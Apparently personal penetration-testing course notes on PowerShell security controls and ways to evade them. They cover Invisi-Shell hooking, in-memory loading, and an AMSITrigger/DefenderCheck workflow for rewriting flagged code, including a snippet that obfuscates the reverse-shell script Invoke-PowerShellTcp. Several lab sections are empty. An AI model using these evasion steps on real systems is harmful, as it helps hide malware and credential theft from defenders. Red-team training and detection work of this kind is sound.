# PowerShell

## Topics Overview

- PowerShell Introduction
- PowerShell Detections
	- System-wide Transcription
	- Script Block Logging
	- AMSI (AntiMalware Scan Interface)
	- Constrained Language Mode (CLM)
- Bypassing PowerShell Security (with Invisi-Shell)
	- Hooking .NET Assemblies
	- Using the CLR Profiler API
	- Invisi-Shell Usage Based on Privileges
- Bypassing AV Signatures for PowerShell
	- Loading Scripts in Memory to Evade AMSI
	- Identifying Detection Points in PowerShell Scripts (with AMSITrigger/DefenderCheck)
	- PowerShell Scripts Obfuscation (with Invoke-Obfuscation)
	- Steps to Avoid Signature Based Detection
- Bypassing AV Signatures for PowerShell - Lab
	- Bypassing AV Signatures for PowerShell (with AMSITrigger)
	- Bypassing AV Signatures for PowerShell (with DefenderCheck)
	- Bypassing AV Signatures for PowerShell (with AMSITrigger/DefenderCheck)

---

## PowerShell Introduction

[...]

## PowerShell Detections

This list includes some of the main PowerShell detection techniques used in Windows defenses to counter malicious scripting in enterprise environments:

1. **System-wide Transcription**
2. **Script Block Logging**
3. **AMSI (AntiMalware Scan Interface)**
4. **Constrained Language Mode (CLM)**

Below is a detailed explanation of each concept.

### System-wide Transcription

**What is it?**

A PowerShell feature that records all session activities, including input and output commands, saving logs in a file for forensic analysis and suspicious activity detection.

**How does it work?**

- When enabled, every command executed by a user in PowerShell is transcribed into a log file.
- It can include information on who executed the command, on which system, and at what time.
- Useful for monitoring admin and user activities to prevent unauthorized actions.

**Bypass?**

Attackers may attempt to disable it or execute code outside of PowerShell to evade logging.

### Script Block Logging

**What is it?**

Records executed script blocks in PowerShell, including functions, inline commands, and dynamically loaded scripts.

**How does it work?**

- More advanced than simple transcription because it captures the code before execution.
- If an attacker runs an obfuscated payload, PowerShell logs both the original and de-obfuscated versions (if possible).
- Stored in Windows event logs (`Event ID 4104`).

**Bypass?**

Attackers may try to further obfuscate the code or use techniques such as **memory injection** to avoid logging.

### AMSI (AntiMalware Scan Interface)

**What is it?**

An interface that allows antivirus and security tools to scan PowerShell code in real time before execution.

**How does it work?**

- When a PowerShell command is executed, AMSI sends it to the antivirus scan engine.
- If detected as suspicious, execution can be blocked.
- Also works with scripting languages like JavaScript and VBScript.

**Bypass?**

- Attackers may attempt to disable AMSI, modify the code in memory, or use exploits to bypass it.
- A common method is **patching AMSI.dll in memory** to prevent it from blocking malicious commands.

### Constrained Language Mode (CLM)

**What is it?**

A restrictive mode in PowerShell that limits the execution of advanced commands, including those used in attacks.

**How does it work?**

- Blocks functions that could be used to execute malicious code, such as `Invoke-Expression` or `Add-Type`.
- Automatically enabled on systems with **Applocker** or **WDAC (Device Guard)** enabled.
- Basic commands remain accessible, but advanced ones are restricted.

**Bypass?**

- If an attacker has admin privileges, they could disable CLM.
- Other languages like C# or abusing `msbuild.exe` could be used to execute malicious code.

### PowerShell Detections Summary

**PowerShell is a powerful tool but is highly monitored in modern systems.**
If you are conducting a penetration test, you must consider that your code may be logged and analyzed in real time. Some strategies to evade these controls include:

✔ **Avoid PowerShell**: Use alternatives like C# or native Windows tools.
✔ **Obfuscate the code**: Change the command format to avoid static detections.
✔ **Bypass AMSI**: Use techniques to disable AMSI in memory.
✔ **Avoid logging**: Execute code from unmonitored processes or inject payloads directly into memory.

---

## Bypassing PowerShell Security (with Invisi-Shell)

In this section, we discuss techniques for bypassing PowerShell security controls using [**Invisi-Shell**](https://github.com/OmerYa/Invisi-Shell), an advanced tool that avoids logging mechanisms by directly interacting with .NET assemblies.

**What is Invisi-Shell?**

Invisi-Shell is a tool designed to execute PowerShell commands **without triggering logging mechanisms** such as Script Block Logging and AMSI.

**How does it work?**

- It does **not** execute `PowerShell.exe` directly.
- Instead, it **interacts with the underlying .NET assemblies**, bypassing traditional security controls.
- The executed commands do not appear in event logs.

**Why is it effective?**

PowerShell is heavily monitored by security solutions, but if commands are executed via the **.NET API**, logging and AMSI detection can be **completely avoided**.

### Hooking .NET Assemblies

**What is hooking?**

Hooking is a technique that allows an attacker to **modify the behavior of system functions** by intercepting their execution.

**Which libraries are hooked?**

Invisi-Shell hooks two critical PowerShell-related .NET assemblies:
- **System.Management.Automation.dll**: this contains the logic for executing PowerShell commands.
- **System.Core.dll**: this contains core .NET functionality.

**What is the purpose of hooking?**

- **Intercept PowerShell execution to bypass logging.**
- **Modify execution behavior without administrators noticing.**
- **Prevent AMSI from detecting malicious scripts.**

### Using the CLR Profiler API

**What is the CLR (Common Language Runtime)?**

The **Common Language Runtime (CLR)** is the execution engine of .NET, similar to the Java Virtual Machine (JVM). It handles memory management, security enforcement, and execution of .NET applications.

**What is a CLR Profiler?**

- A **CLR Profiler** is a **DLL that attaches to the CLR** to monitor and modify code execution.
- The **profiling API** allows the profiler to **intercept and alter .NET behavior dynamically**.

**How does it bypass PowerShell security?**

- Invisi-Shell **uses the CLR Profiler API to hook PowerShell's .NET assemblies**.
- This enables the tool to **execute PowerShell commands without triggering logs or AMSI detection**.
- Since modifications occur in memory, the execution remains **invisible to traditional security mechanisms**.

### Invisi-Shell Usage Based on Privileges

- With admin privileges: `RunWithPathAsAdmin.bat`.
- With non-admin privileges: `RunWithRegistryNonAdmin.bat`.
- Type `exit` from the new PowerShell session to complete the clean-up.

### Bypassing PowerShell Security (with Invisi-Shell) Summary

✔ **Invisi-Shell executes PowerShell commands stealthily by manipulating .NET APIs.**
✔ **It hooks key PowerShell libraries (`System.Management.Automation.dll` and `System.Core.dll`) to avoid detection.**
✔ **It leverages the CLR Profiler API to modify execution behavior in memory.**
✔ **This technique is commonly used in Red Team engagements for stealthy command execution.**

**Defenders should monitor unusual .NET profiler activity and restrict profiler loading via security policies.**

---

## Bypassing AV Signatures for PowerShell (with AMSITrigger/DefenderCheck/Invoke-Obfuscation)

Windows Defender and other antivirus solutions detect malicious PowerShell scripts primarily through two methods:
1. **Signature-Based Detection**: known malicious code patterns are identified.
2. **Behavioral Analysis and AMSI (AntiMalware Scan Interface)**: code is analyzed dynamically for suspicious behavior.

Several techniques can be used to avoid detection.

### Loading Scripts in Memory to Evade AMSI

**Why is AMSI a problem?**

AMSI scans PowerShell commands **before** execution, meaning that even obfuscated code can be detected if its behavior is suspicious.

**Solution: In-Memory Execution**

If we load the script directly into memory (without writing it to disk), **Windows Defender cannot scan it using signature-based detection**, reducing the chances of detection.

**AMSI Bypass**

Attackers frequently use techniques to disable or bypass AMSI, allowing PowerShell scripts to execute undetected.

### Identifying Detection Points in PowerShell Scripts (with AMSITrigger/DefenderCheck)

**How does Windows Defender detect scripts?**

Windows Defender maintains a database of **signatures** that recognize malicious scripts based on specific patterns in the code.

**Tools to Identify Detection Points**

To determine **which parts of a script trigger detections**, we can use the following tools:

1️. [**AMSITrigger**](https://github.com/RythmStick/AMSITrigger)
   - Analyzes PowerShell scripts and identifies which strings or code segments trigger AMSI detection.
   - Helps pinpoint the sections that need modification or obfuscation.

2️. [**DefenderCheck**](https://github.com/t3hbb/DefenderCheck)
   - Scans a file to determine which parts of the code are detected by Windows Defender.
   - Useful for identifying key detection points that need to be modified.

**Scanning a PowerShell Script for Detection**

Examples of how to identify which code Windows Defender flags:

```
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```

```
DefenderCheck.exe PowerUp.ps1
```

**What do these commands do?**

- Scan the **Invoke-PowerShellTcp_Detected.ps1** and **PowerUp.ps1** scripts to see which parts are flagged by Defender.
- Once the problematic sections are identified, we can modify or obfuscate them to evade detection.

### PowerShell Scripts Obfuscation (with Invoke-Obfuscation)

**What is Invoke-Obfuscation?**

[**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation) is an advanced tool for obfuscating PowerShell scripts, making them harder for AMSI and Windows Defender to detect.

**Why is it useful?**

- It alters the appearance of the code without changing its functionality.
- It can **fragment**, rearrange, and replace recognizable keywords.
- Enables **more effective bypasses** against AMSI and Windows Defender.

**Practical Use**

- If AMSITrigger and DefenderCheck identify suspicious signatures, **Invoke-Obfuscation** can be used to modify them automatically.
- It is also used in the course to obfuscate AMSI bypass techniques.

### Steps to Avoid Signature Based Detection

1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat the steps 2 and 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank".

### Bypassing AV Signatures for PowerShell Summary

**Key Takeaways**

✔ **Windows Defender relies on signature-based detection to identify malicious PowerShell scripts.**
✔ **AMSITrigger and DefenderCheck help find which parts of a script are flagged.**
✔ **Loading scripts in memory helps evade AMSI and signature-based detection.**
✔ **Invoke-Obfuscation can obfuscate scripts to avoid detection.**

---

## Bypassing AV Signatures for PowerShell - Lab

### Bypassing AV Signatures for PowerShell (with AMSITrigger)

Let's try to check *Invoke-PowerShellTcp* with **AMSITrigger**.

`AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`:
```

```
❌

Reverse the `Net.Sockets` string on line number 32:

```powershell
$String = "stekcoS.teN"

$class = ([regex]::Matches($String,'.', 'RightToLeft') | ForEach
{$_.value}) -join ''
if ($Reverse)
{
	$client = New-Object System.$class.TCPClient($IPAddress,$Port)
}
```

`AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`:
```

```

### Bypassing AV Signatures for PowerShell (with DefenderCheck)

Let's try to check *PowerUp* with **DefenderCheck**.

``:
```

```

``:
```

```

``:
```

```

### Bypassing AV Signatures for PowerShell (with AMSITrigger/DefenderCheck)

Let's try to check *Invoke-Mimikatz* with **AMSITrigger**.

``:
```

```

``:
```

```

``:
```

```

---
---
